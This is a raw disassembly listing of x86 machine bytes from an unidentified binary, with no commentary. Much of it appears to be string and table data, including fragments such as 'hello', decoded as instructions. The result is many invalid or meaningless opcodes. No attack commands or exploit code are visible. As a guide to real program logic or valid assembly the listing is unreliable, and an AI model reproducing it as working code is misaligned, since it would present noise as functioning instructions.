  4222c8:	push   0x686c6c65
  4222cd:	gs ins BYTE PTR es:[edi],dx
  4222cf:	ins    BYTE PTR es:[edi],dx
  4222d0:	push   0x686c6c65
  4222d5:	gs ins BYTE PTR es:[edi],dx
  4222d7:	ins    BYTE PTR es:[edi],dx
  4222d8:	push   0x686c6c65
  4222dd:	gs ins BYTE PTR es:[edi],dx
  4222df:	ins    BYTE PTR es:[edi],dx
  4222e0:	push   0x686c6c65
  4222e5:	gs ins BYTE PTR es:[edi],dx
  4222e7:	ins    BYTE PTR es:[edi],dx
  4222e8:	add    BYTE PTR [eax],al
  4222ea:	add    BYTE PTR [eax],al
  4222ec:	outs   dx,DWORD PTR ds:[esi]
  4222ed:	add    BYTE PTR [eax+eax*1+0x65],ch
  4222f1:	add    BYTE PTR [ecx+0x0],ah
  4222f4:	jne    0x4222f6
  4222f6:	je     0x4222f8
  4222f8:	xor    eax,DWORD PTR [eax]
  4222fa:	xor    al,BYTE PTR [eax]
  4222fc:	add    BYTE PTR [eax],al
  4222fe:	add    BYTE PTR [eax],al
  422300:	push   0x61006500
  422305:	add    BYTE PTR [esi+0x0],dh
  422308:	add    BYTE PTR gs:[esi+0x0],ch
  42230c:	push   0x61006500
  422311:	add    BYTE PTR [esi+0x0],dh
  422314:	add    BYTE PTR gs:[esi+0x0],ch
  422318:	push   0x61006500
  42231d:	add    BYTE PTR [esi+0x0],dh
  422320:	add    BYTE PTR gs:[esi+0x0],ch
  422324:	push   0x61006500
  422329:	add    BYTE PTR [esi+0x0],dh
  42232c:	add    BYTE PTR gs:[esi+0x0],ch
  422330:	push   0x61006500
  422335:	add    BYTE PTR [esi+0x0],dh
  422338:	add    BYTE PTR gs:[esi+0x0],ch
  42233c:	push   0x61006500
  422341:	add    BYTE PTR [esi+0x0],dh
  422344:	add    BYTE PTR gs:[esi+0x0],ch
  422348:	push   0x61006500
  42234d:	add    BYTE PTR [esi+0x0],dh
  422350:	add    BYTE PTR gs:[esi+0x0],ch
  422354:	push   0x61006500
  422359:	add    BYTE PTR [esi+0x0],dh
  42235c:	add    BYTE PTR gs:[esi+0x0],ch
  422360:	push   0x61006500
  422365:	add    BYTE PTR [esi+0x0],dh
  422368:	add    BYTE PTR gs:[esi+0x0],ch
  42236c:	add    BYTE PTR [eax],al
  42236e:	add    BYTE PTR [eax],al
  422370:	in     al,dx
  422371:	and    al,BYTE PTR [edx+0x0]
  422374:	dec    edi
  422375:	ins    BYTE PTR es:[edi],dx
  422376:	gs dec ecx
  422378:	arpl   WORD PTR [edi+0x6e],bp
  42237b:	push   esp
  42237c:	outs   dx,DWORD PTR ds:[esi]
  42237d:	inc    ebx
  42237e:	jne    0x4223f2
  422380:	jae    0x4223f1
  422382:	jb     0x422384
  422384:	je     0x4223a9
  422386:	inc    edx
	...
  42238f:	add    BYTE PTR [eax],dh
  422391:	daa    
  422392:	inc    edx
  422393:	add    BYTE PTR [eax],bh
  422395:	daa    
  422396:	inc    edx
  422397:	add    al,dh
  422399:	and    eax,0x43f20042
  42239e:	push   ebx
  42239f:	mov    WORD PTR ds:0x1a49ba4,ss
  4223a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223a6:	popf   
  4223a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223a8:	jno    0x42234e
  4223aa:	xchg   edi,eax
  4223ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223ac:	or     esp,DWORD PTR [ecx+ecx*4-0x7c5bac5c]
  4223b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223b4:	sbb    DWORD PTR [ebp+eax*4-0x445b645c],esp
  4223bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223bc:	rol    DWORD PTR [edx-0x5b6a732f],cl
  4223c2:	adc    eax,0x1a49ba4
  4223c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223c8:	popf   
  4223c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223ca:	jno    0x422370
  4223cc:	xchg   edi,eax
  4223cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223ce:	or     esp,DWORD PTR [ecx+ecx*4-0x7c5bac5c]
  4223d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223d6:	xor    eax,0x9ba485a4
  4223db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223dc:	mov    ebx,0xd1e2d3a4
  4223e1:	in     al,dx
  4223e2:	xchg   ebp,eax
  4223e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223e4:	adc    eax,0x3ba49ba4
  4223e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223ea:	popf   
  4223eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223ec:	sbb    DWORD PTR [ebp+edx*4-0x705b805c],esp
  4223f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223f4:	fwait
  4223f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223f6:	xchg   DWORD PTR [ebx+edx*8-0xe332e3e],esp
  4223fd:	sub    al,0xf7
  4223ff:	cs pop ss
  422401:	push   cs
  422402:	adc    eax,0x3a49108
  422407:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422408:	fwait
  422409:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42240a:	add    esp,DWORD PTR [ebx+edx*4-0x6a5b805c]
  422411:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422412:	sbb    DWORD PTR [ebp+ecx*4-0x7c5b645c],esp
  422419:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42241a:	shl    DWORD PTR [edx],cl
  42241c:	shr    DWORD PTR [ecx+esi*8],1
  42241f:	or     al,0xf7
  422421:	push   cs
  422422:	pop    ss
  422423:	outs   dx,BYTE PTR ds:[esi]
  422424:	adc    eax,0x3a49168
  422429:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42242a:	fwait
  42242b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42242c:	add    esp,DWORD PTR [ebx+edx*4-0x6a5b805c]
  422433:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422434:	xor    eax,0x9ba48da4
  422439:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42243a:	and    DWORD PTR [ebx+edx*8-0xef32efe],0x6c
  422442:	imul   DWORD PTR [esi+0x17]
  422445:	dec    esi
  422446:	adc    eax,0x37a49148
  42244b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42244c:	fwait
  42244d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42244e:	jae    0x4223f4
  422450:	popf   
  422451:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422452:	sbb    DWORD PTR [ebp+edx*4-0x705bba5c],esp
  422459:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42245a:	fwait
  42245b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42245c:	and    DWORD PTR [ebx+edx*8-0xe932e9e],0x4c
  422464:	test   DWORD PTR [esi+0x16],0x91a814ae
  42246b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42246c:	aaa    
  42246d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42246e:	fwait
  42246f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422470:	jae    0x422416
  422472:	popf   
  422473:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422474:	pop    ss
  422475:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422476:	xchg   ebp,eax
  422477:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422478:	push   ecx
  422479:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42247a:	mov    DWORD PTR [ebx+ebx*4-0x2c5b725c],esp
  422481:	inc    edx
  422482:	ror    DWORD PTR [eax+esi*8-0x54],1
  422486:	imul   BYTE PTR [esi-0x77eb71ea]
  42248c:	xchg   ecx,eax
  42248d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42248e:	aaa    
  42248f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422490:	fwait
  422491:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422492:	jae    0x422438
  422494:	popf   
  422495:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422496:	cmp    esp,DWORD PTR [ebp+edx*4-0x705b8c5c]
  42249d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42249e:	fwait
  42249f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224a0:	xchg   DWORD PTR [edx+edx*8-0xf532f5e],esp
  4224a7:	mov    esi,?
  4224a9:	mov    ss,WORD PTR [esi]
  4224ab:	out    dx,al
  4224ac:	adc    al,0xe8
  4224ae:	xchg   ecx,eax
  4224af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224b0:	aaa    
  4224b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224b2:	fwait
  4224b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224b4:	jae    0x42245a
  4224b6:	popf   
  4224b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224b8:	cmp    DWORD PTR [ebp+edx*4-0x705b805c],esp
  4224bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224c0:	fwait
  4224c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224c2:	and    DWORD PTR [edx+edx*8-0xf732f7e],0xffffffec
  4224ca:	imul   dh
  4224cc:	push   ss
  4224cd:	into   
  4224ce:	adc    al,0xc8
  4224d0:	xchg   ecx,eax
  4224d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224d2:	cmp    eax,0x51a49ba4
  4224d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224d8:	popf   
  4224d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224da:	jnp    0x422480
  4224dc:	xchg   ebx,eax
  4224dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224de:	fwait
  4224df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224e0:	xchg   ecx,eax
  4224e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224e2:	shl    dl,cl
  4224e4:	shr    ah,1
  4224e6:	lock int3 
  4224e8:	test   dh,0x16
  4224eb:	cs adc al,0x28
  4224ee:	push   ss
  4224ef:	push   cs
  4224f0:	adc    al,0x8
  4224f2:	xchg   ebx,eax
  4224f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224f4:	adc    DWORD PTR [ebx+ebx*4-0x605bb65c],esp
  4224fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224fc:	cmp    esp,DWORD PTR [ebx+edx*4-0x765b825c]
  422503:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422504:	fwait
  422505:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422506:	lea    esp,[edx+edx*8-0xfd32fde]
  42250d:	or     al,0xf6
  42250f:	push   cs
  422510:	push   ss
  422511:	outs   dx,BYTE PTR ds:[esi]
  422512:	adc    al,0x68
  422514:	xchg   ecx,eax
  422515:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422516:	add    BYTE PTR [eax],al
  422518:	mov    al,ds:0xac004223
  42251d:	and    eax,0x25b40042
  422522:	inc    edx
  422523:	add    BYTE PTR [edi+eiz*1],bh
  422526:	inc    edx
  422527:	add    BYTE PTR [eax-0x47ffbddd],bl
  42252d:	and    eax,0x7c1a0042
  422532:	inc    edx
  422533:	add    BYTE PTR [edx-0x57ffbd82],dl
  422539:	es inc edx
  42253b:	add    BYTE PTR [edi+eiz*1],ch
  42253e:	inc    edx
  42253f:	add    BYTE PTR [ebp+eiz*1+0x25980042],dl
  422546:	inc    edx
  422547:	add    BYTE PTR [eax],ch
  422549:	daa    
  42254a:	inc    edx
  42254b:	add    ah,bh
  42254d:	and    eax,0xcb4a0042
  422552:	push   es
  422553:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422554:	scas   al,BYTE PTR es:[edi]
  422555:	or     al,0x6
  422557:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422558:	mov    al,0x25
  42255a:	inc    edx
  42255b:	add    BYTE PTR [eax+0x26],ah
  42255e:	inc    edx
  42255f:	add    BYTE PTR [esi+eiz*1+0x42],dh
  422563:	add    BYTE PTR [eax-0x6fffbdda],al
  422569:	es inc edx
  42256b:	add    al,ch
  42256d:	and    eax,0x239c0042
  422572:	inc    edx
  422573:	add    BYTE PTR [eax],cl
  422575:	es inc edx
  422577:	add    al,bh
  422579:	and    eax,0x27400042
  42257e:	inc    edx
  42257f:	add    BYTE PTR [esi+0x38a4069a],ch
  422585:	inc    ebx
  422586:	out    0xbd,eax
  422588:	sbb    BYTE PTR [esi],ah
  42258a:	inc    edx
  42258b:	add    BYTE PTR [eax],ah
  42258d:	es inc edx
  42258f:	add    BYTE PTR [ebp+eiz*1-0x78dbffbe],bh
  422596:	loopne 0x422555
  422598:	jbe    0x422615
  42259a:	pop    ds
  42259b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42259c:	add    BYTE PTR [eax],al
  42259e:	inc    eax
  42259f:	add    dl,ch
  4225a1:	rcl    dl,cl
  4225a3:	pop    ecx
  4225a4:	(bad)  
  4225a5:	jle    0x4225e9
  4225a7:	add    bl,bl
  4225a9:	outs   dx,DWORD PTR fs:[esi]
  4225ab:	arpl   WORD PTR [edi+0xf],si
  4225ae:	pop    ebx
  4225af:	xor    DWORD PTR [esi-0x5],esi
  4225b2:	(bad)  
  4225b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4225b4:	mov    dl,0xc
  4225b6:	xchg   ebx,eax
  4225b7:	test   al,0xa4
  4225b9:	and    eax,0xdaaa0042
  4225be:	push   es
  4225bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4225c0:	stos   BYTE PTR es:[edi],al
  4225c1:	fiadd  WORD PTR [esi]
  4225c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4225c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4225c5:	fiadd  DWORD PTR [esi]
  4225c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4225c8:	mov    ds:0xbea406da,al
  4225cd:	fiadd  DWORD PTR [esi]
  4225cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4225d0:	mov    edx,0xb6a406da
  4225d5:	fiadd  DWORD PTR [esi]
  4225d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4225d8:	mov    dl,0xda
  4225da:	push   es
  4225db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4225dc:	mov    ds,edx
  4225de:	push   es
  4225df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4225e0:	mov    bl,dl
  4225e2:	push   es
  4225e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4225e4:	out    dx,al
  4225e5:	fiadd  DWORD PTR [esi]
  4225e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4225e8:	dec    DWORD PTR [ebx]
  4225ea:	adc    edi,DWORD PTR [edx]
  4225ec:	xchg   esp,eax
  4225ed:	and    eax,DWORD PTR [edx+0x0]
  4225f0:	test   DWORD PTR [eax],ebp
  4225f2:	inc    edx
  4225f3:	add    BYTE PTR [edi],dl
  4225f5:	loop   0x422580
  4225f7:	js     0x4225a7
  4225f9:	call   0xa4d7:0xcb3aa406
  422600:	and    al,0x75
  422602:	add    BYTE PTR [eax],al
  422604:	nop
  422605:	and    eax,DWORD PTR [edx+0x0]
  422608:	and    al,BYTE PTR [ebx+0x1b]
  42260b:	add    BYTE PTR [eax],0x0
	...
  422616:	add    BYTE PTR [eax],al
  422618:	hlt    
  422619:	clc    
  42261a:	sar    BYTE PTR [ebp+0x319340bf],cl
  422620:	sub    eax,DWORD PTR [edi+0x1f]
  422623:	jle    0x422625
	...
  422649:	add    BYTE PTR [eax],al
  42264b:	add    BYTE PTR [edx],bl
  42264d:	jl     0x422691
	...
  42265b:	add    cl,bh
  42265d:	jmp    0xa48f26a3
  422662:	push   ecx
  422663:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422664:	jg     0x42260a
  422666:	inc    edi
  422667:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422668:	push   ecx
  422669:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42266a:	inc    ebx
  42266b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42266c:	std    
  42266d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42266e:	jmp    DWORD PTR [ebx+ebx*4+0x550000a4]
  422675:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422676:	push   ebx
  422677:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422678:	dec    ecx
  422679:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42267a:	std    
  42267b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42267c:	jmp    DWORD PTR [ebx+ebx*4+0x7da471a4]
  422683:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422684:	push   ecx
  422685:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422686:	jg     0x42262c
  422688:	std    
  422689:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42268a:	jmp    DWORD PTR [ebx+ebx*4+0x7d0000a4]
  422691:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422692:	dec    ebx
  422693:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422694:	inc    ebx
  422695:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422696:	jne    0x42263c
  422698:	pop    ecx
  422699:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42269a:	jnp    0x422640
  42269c:	dec    ecx
  42269d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42269e:	fwait
  42269f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
	...
  4226a8:	xor    eax,eax
  4226aa:	xor    esp,DWORD PTR [eax]
  4226ac:	xor    eax,DWORD PTR [eax]
  4226ae:	xor    esp,DWORD PTR [eax+0x33]
  4226b1:	inc    eax
  4226b2:	xor    ah,BYTE PTR [eax-0x1fcd7fce]
  4226b8:	xor    al,al
  4226ba:	xor    ah,BYTE PTR [eax]
  4226bc:	xor    al,BYTE PTR [eax]
  4226be:	xor    ah,BYTE PTR [eax+0x32]
  4226c1:	inc    eax
  4226c2:	xor    eax,DWORD PTR [eax-0x3dcc1fcd]
  4226c8:	xor    ecx,esp
  4226ca:	xor    ecx,esi
  4226cc:	xor    ecx,eax
  4226ce:	xor    ecx,edx
  4226d0:	xor    edx,esp
  4226d2:	xor    edx,esi
  4226d4:	xor    edx,eax
  4226d6:	xor    edx,edx
  4226d8:	xor    ebx,esp
  4226da:	xor    ebx,esi
  4226dc:	xor    ebx,eax
  4226de:	xor    ebx,edx
  4226e0:	xor    eax,esi
  4226e2:	push   ebx
  4226e3:	shl    BYTE PTR [ebx-0x40],0x93
  4226e7:	rcl    DWORD PTR [esi-0x56],0x15
  4226eb:	into   
  4226ec:	xchg   ebp,eax
  4226ed:	dec    ecx
  4226ee:	xor    ecx,esp
  4226f0:	sbb    eax,0x50abaae2
  4226f5:	push   0x1e
  4226f7:	cs je  0x42270e
  4226fa:	mov    DWORD PTR [ebx+0x546ad794],ecx
  422700:	imul   edi,edx,0xffffffd5
  422703:	leave  
  422704:	daa    
  422705:	dec    eax
  422706:	out    dx,eax
  422707:	pushf  
  422708:	mov    dh,0xdf
  42270a:	dec    esi
  42270b:	xchg   ebp,eax
  42270c:	lock xor DWORD PTR [esi-0x6c],ebp
  422710:	inc    ebp
  422711:	or     eax,0xc1470876
  422716:	js     0x4226d3
  422718:	popa   
  422719:	pop    ecx
  42271a:	jecxz  0x422787
  42271c:	mov    BYTE PTR [edx-0x56],0x5
  422720:	cs enter 0xaa46,0x44
  422725:	aas    
  422726:	inc    ebp
  422727:	leave  
  422728:	test   BYTE PTR [ebx+0x819a593],0xd8
  42272f:	jl     0x422759
  422731:	mov    es,WORD PTR [edx+0x0]
  422734:	jb     0x422790
  422736:	pop    ss
  422737:	sub    ebx,DWORD PTR [ebp+eiz*1+0x26000042]
  42273e:	inc    edx
  42273f:	add    BYTE PTR [esi-0x5],dh
  422742:	fbld   TBYTE PTR [ebp+0x0]
	...
  422750:	adc    edi,DWORD PTR [edx+0x6f6bd319]
  422756:	popa   
  422757:	arpl   WORD PTR [edi+0x7a],bp
  42275a:	popa   
  42275b:	outs   dx,DWORD PTR ds:[si]
  42275d:	gs ins DWORD PTR es:[edi],dx
  42275f:	jae    0x4227a3
  422761:	outs   dx,DWORD PTR ds:[esi]
  422762:	ins    BYTE PTR es:[edi],dx
  422763:	gs mov cl,0x65
  422766:	in     eax,dx
  422767:	jg     0x4227a2
  422769:	ja     0x4227d4
  42276b:	jp     0x422760
  42276d:	inc    esp
  42276e:	push   0x1b
  422770:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422771:	push   ecx
  422772:	dec    esp
  422773:	gs jb  0x4227ef
  422776:	popa   
  422777:	push   ebx
  422778:	jne    0x4227eb
  42277a:	jae    0x4227dd
  42277c:	imul   esi,DWORD PTR [edx+0x6f],0x91565070
  422783:	inc    esp
  422784:	(bad)  [edx+0x65]
  422787:	jae    0x4227df
  422789:	imul   esi,DWORD PTR [ebx+0x61],0x616c6974
  422790:	jb     0x4227f4
  422792:	gs je  0x422768
  422795:	lds    edx,FWORD PTR [eax-0x68]
  422798:	xor    dl,BYTE PTR [eax+ecx*1+0x1d]
  42279c:	fs jne 0x42280e
  42279f:	push   eax
  4227a0:	gs fs jae 0x422811
  4227a4:	popa   
  4227a5:	ins    DWORD PTR es:[edi],dx
  4227a6:	imul   esi,DWORD PTR [ebx+0x0],0x0
	...
  4227b9:	add    BYTE PTR [eax],al
  4227bb:	add    BYTE PTR [esp+ecx*4],ch
  4227be:	push   ss
  4227bf:	mov    esi,0x6f4c8773
  4227c4:	jb     0x422834
  4227c6:	jno    0x422831
  4227c8:	or     al,0x36
  4227ca:	lods   al,BYTE PTR ds:[esi]
  4227cb:	repnz push edx
  4227cd:	je     0x42283e
  4227cf:	je     0x422815
  4227d1:	js     0x42278f
  4227d3:	cmc    
  4227d4:	outs   dx,DWORD PTR ds:[esi]
  4227d5:	ins    DWORD PTR es:[edi],dx
  4227d6:	popa   
  4227d7:	imul   esp,DWORD PTR [eax-0x77],0x67411cbf
  4227de:	popa   
  4227df:	jb     0x422856
  4227e1:	push   0x68736f79
  4227e6:	imul   ebp,DWORD PTR [esi+0x74],0x1d006261
  4227ed:	mov    ch,0xa5
  4227ef:	jns    0x422864
  4227f1:	outs   dx,DWORD PTR ds:[esi]
  4227f2:	addr16 popa 
  4227f4:	add    BYTE PTR [bp+si],bh
  4227f7:	sub    bh,cl
  4227f9:	icebp  
  4227fa:	gs ins BYTE PTR es:[edi],dx
  4227fc:	jae    0x422846
  4227fe:	popa   
  4227ff:	je     0x422869
  422801:	ins    DWORD PTR es:[edi],dx
  422802:	add    BYTE PTR gs:[bx+si],al
  422806:	in     al,dx
  422807:	mov    ecx,0x414ad1d2
  42280c:	ins    DWORD PTR es:[edi],dx
  42280d:	imul   esi,DWORD PTR [ebx+0x4b],0x676c686f
  422814:	gs ins DWORD PTR es:[edi],dx
  422816:	add    BYTE PTR [eax],al
  422818:	jne    0x42282a
  42281a:	popa   
  42281b:	or     BYTE PTR [esi+0x73654dbb],al
  422821:	popa   
  422822:	push   0x78000061
  422827:	loope  0x42286b
  422829:	stos   BYTE PTR es:[edi],al
  42282a:	je     0x42288d
  42282c:	push   edi
  42282d:	popa   
  42282e:	jb     0x42289b
  422830:	jae    0x42289d
  422832:	imul   esi,DWORD PTR [edx+0x68],0x4100006f
  422839:	loope  0x422807
  42283b:	aad    0x6f
  42283d:	jb     0x4228ab
  42283f:	imul   ebp,DWORD PTR [ebp+0x69],0x8b060000
  422846:	je     0x42285b
  422848:	adc    al,BYTE PTR [ebp+0x77646172]
  42284e:	outs   dx,DWORD PTR ds:[esi]
  42284f:	gs ins DWORD PTR es:[edi],dx
  422851:	imul   edi,DWORD PTR [eax+0x66],0x65706769
  422858:	outs   dx,BYTE PTR ds:[esi]
  422859:	shr    DWORD PTR fs:[ebx+0x61018e3a],cl
  422860:	ja     0x4228c6
  422862:	outs   dx,DWORD PTR ds:[esi]
  422863:	popa   
  422864:	outs   dx,BYTE PTR ds:[esi]
  422865:	gs jae 0x4228ca
  422868:	imul   ebp,DWORD PTR [edi+0x72],0x75536465
  42286f:	imul   esi,DWORD PTR [edi+edx*2+0x6f],0x2dea6576
  422877:	inc    ebx
  422878:	jb     0x422833
  42287a:	sbb    al,0xd9
  42287c:	jo     0x4228e7
  42287e:	addr16 js 0x4228f6
  422881:	jo     0x4228f8
  422883:	fs add ch,cl
  422886:	xchg   esi,eax
  422887:	in     eax,dx
  422888:	jno    0x4228fb
  42288a:	iret   
  42288b:	jbe    0x422886
  42288d:	or     dh,BYTE PTR [esi-0x3]
  422890:	cwde   
  422891:	int    0xd6
  422893:	std    
  422894:	pop    ebp
  422895:	fsubr  DWORD PTR [edi]
  422897:	dec    edx
  422898:	xor    eax,0xd6cd860a
  42289d:	stc    
  42289e:	inc    ebx
  42289f:	adc    DWORD PTR [eax+0x6e7988d6],ebp
  4228a5:	dec    edx
  4228a6:	sbb    BYTE PTR [ecx+0x52],bh
  4228a9:	mov    ch,al
  4228ab:	jns    0x4228ff
  4228ad:	dec    edx
  4228ae:	sbb    BYTE PTR [ecx+0x6e],bh
  4228b1:	xchg   edx,eax
  4228b2:	cmp    eax,0xcd96c5cb
  4228b7:	in     eax,dx
  4228b8:	jno    0x42292b
  4228ba:	iret   
  4228bb:	jbe    0x4228b6
  4228bd:	or     dh,BYTE PTR [esi-0x3]
  4228c0:	int    0x96
  4228c2:	std    
  4228c3:	pop    ebp
  4228c4:	jns    0x422911
  4228c6:	pop    edx
  4228c7:	xor    eax,0x96cd920a
  4228cc:	stc    
  4228cd:	inc    ebx
  4228ce:	icebp  
  4228cf:	(bad)  
  4228d0:	das    
  4228d1:	int    0x76
  4228d3:	mov    BYTE PTR [ecx+0x6e],bh
  4228d6:	mov    DWORD PTR [edx-0x13749387],esi
  4228dc:	jns    0x42294c
  4228de:	xchg   BYTE PTR [edi-0x3d789187],ah
  4228e4:	retf   
  4228e5:	rol    BYTE PTR [eax+eax*4+0x71edcd96],cl
  4228ec:	jno    0x4228bd
  4228ee:	jbe    0x4228e9
  4228f0:	or     dh,BYTE PTR [esi-0x3]
  4228f3:	int    0x96
  4228f5:	std    
  4228f6:	pop    ebp
  4228f7:	fdiv   DWORD PTR [ebx-0x6df55465]
  4228fd:	int    0x96
  4228ff:	stc    
  422900:	inc    ebx
  422901:	icebp  
  422902:	(bad)  
  422903:	test   BYTE PTR [ecx+0x6e],bh
  422906:	mov    ebp,esp
  422908:	int    0x76
  42290a:	mov    BYTE PTR [ecx+0x6e],bh
  42290d:	add    DWORD PTR [edi+0x79],0xcbd2896c
  422914:	rol    BYTE PTR [eax+eax*4+0x71edcd96],cl
  42291b:	jno    0x4228ec
  42291d:	jbe    0x422918
  42291f:	or     dh,BYTE PTR [esi-0x3]
  422922:	cwde   
  422923:	int    0xd6
  422925:	std    
  422926:	pop    ebp
  422927:	ret    0x2be4
  42292a:	cmp    DWORD PTR [edx],ecx
  42292c:	xchg   ch,cl
  42292e:	(bad)  
  42292f:	stc    
  422930:	inc    ebx
  422931:	adc    DWORD PTR [eax+0x52794ad6],ebp
  422937:	test   BYTE PTR [ebx-0x78913648],ch
  42293d:	ret    0x79ab
  422940:	xchg   edx,eax
  422941:	aad    0xcb
  422943:	lds    edx,FWORD PTR [esi+0x7171edcd]
  422949:	iret   
  42294a:	jbe    0x422945
  42294c:	or     dh,BYTE PTR [esi-0x3]
  42294f:	int    0x96
  422951:	std    
  422952:	pop    ebp
  422953:	pop    ecx
  422954:	ins    BYTE PTR es:[edi],dx
  422955:	cmp    dh,BYTE PTR ds:0x96cd920a
  42295b:	stc    
  42295c:	inc    ebx
  42295d:	icebp  
  42295e:	(bad)  
  42295f:	push   ebx
  422960:	int    0x76
  422962:	mov    BYTE PTR [ecx+0x6e],bh
  422965:	mov    BYTE PTR [edi+0x47816c79],ah
  42296b:	jns    0x4229db
  42296d:	test   DWORD PTR [ebx-0x7f7b2d35],esp
  422973:	call   0xcded:0xcd965b98
  42297a:	jbe    0x4229b0
  42297c:	xor    DWORD PTR [esi+0x3c],0xd6cdfd70
  422983:	sbb    al,0x81
  422985:	(bad)  
  422986:	and    al,0x98
  422988:	int    0xd6
  42298a:	adc    al,0x47
  42298c:	mov    ds:0xff8eca62,al
  422991:	add    al,0x7d
  422993:	add    ch,dl
  422995:	lods   eax,DWORD PTR ds:[esi]
  422996:	clc    
  422997:	icebp  
  422998:	jo     0x422964
  42299a:	(bad)  
  42299c:	jge    0x42299e
  42299e:	aad    0xad
  4229a0:	clc    
  4229a1:	icebp  
  4229a2:	jo     0x422936
  4229a4:	adc    ecx,ebp
